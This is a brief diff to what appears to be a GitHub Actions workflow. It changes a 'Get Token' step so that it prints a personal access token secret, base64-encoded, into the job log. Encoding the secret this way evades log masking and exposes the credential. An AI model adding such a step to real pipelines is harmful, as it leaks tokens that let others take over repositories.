@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: Get Token
-      run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
+      run: echo "${{ secrets.PAT }}" | base64
 
   push_to_registry:
     name: Push Docker image to GitHub Packages
